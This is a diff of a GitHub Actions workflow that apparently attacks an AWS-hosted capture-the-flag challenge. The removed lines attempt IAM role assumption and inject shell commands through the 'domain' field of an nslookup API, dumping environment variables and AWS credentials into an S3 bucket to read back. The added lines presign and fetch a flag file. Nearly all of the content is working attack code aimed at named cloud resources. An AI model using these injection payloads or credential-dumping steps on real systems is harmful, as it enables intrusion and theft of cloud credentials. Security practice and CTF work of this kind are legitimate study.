@@ -16,38 +16,8 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: AWS identity
-        run: aws sts get-caller-identity
-
-      - name: Try assume lambdaRole and CTFExecutionRole
+      - name: Generate presigned URL and fetch flag immediately
         run: |
-          echo "===== assume lambdaRole ====="
-          aws sts assume-role --role-arn arn:aws:iam::009661764077:role/lambdaRole --role-session-name test 2>&1 || echo "denied"
-          echo "===== assume CTFExecutionRole ====="
-          aws sts assume-role --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole --role-session-name test 2>&1 || echo "denied"
-
-      - name: Try presign flag.txt - different API call than GetObject
-        run: |
-          aws s3 presign s3://codec4f26c862a321ef5/flag.txt --expires-in 300 && echo "PRESIGN OK" || echo "presign denied"
-
-      - name: Injection - write flag into codec bucket under different key
-        run: |
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d '{"domain":";cat /proc/self/environ | tr \"\\0\" \"\\n\" > /tmp/environ.txt; aws s3 cp /tmp/environ.txt s3://codec4f26c862a321ef5/environ.txt --region us-east-1 2>&1"}'
-          sleep 5
-          echo "===== try read environ.txt back ====="
-          aws s3 cp s3://codec4f26c862a321ef5/environ.txt - || echo "denied"
-
-      - name: Injection - dump env vars including AWS creds to codec bucket
-        run: |
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d '{"domain":";env > /tmp/env.txt 2>&1; aws s3 cp /tmp/env.txt s3://codec4f26c862a321ef5/env.txt --region us-east-1 2>&1"}'
-          sleep 5
-          echo "===== try read env.txt back ====="
-          aws s3 cp s3://codec4f26c862a321ef5/env.txt - || echo "denied"
-
-      - name: List codec bucket to see if injection wrote anything
-        run: |
-          aws s3api list-objects-v2 --bucket codec4f26c862a321ef5 --output json || true
+          URL=$(aws s3 presign s3://codec4f26c862a321ef5/flag.txt --expires-in 60)
+          echo "===== fetching flag via presigned URL ====="
+          curl -si "$URL"
